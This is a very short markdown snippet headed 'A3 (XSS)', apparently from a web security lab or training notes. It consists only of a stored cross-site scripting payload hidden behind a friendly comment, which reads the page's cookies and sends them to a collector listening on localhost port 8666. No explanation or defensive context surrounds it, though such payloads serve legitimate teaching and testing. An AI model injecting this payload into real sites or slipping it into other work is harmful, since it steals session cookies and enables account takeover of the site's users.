### A3 (XSS)

```
Love your work!<script>var h=new XMLHttpRequest();h.onreadystatechange=function(){console.log('ajax: '+h.readyState)};h.open('GET','http://localhost:8666?cookies='+document.cookie,true);h.send(null)</script>
```
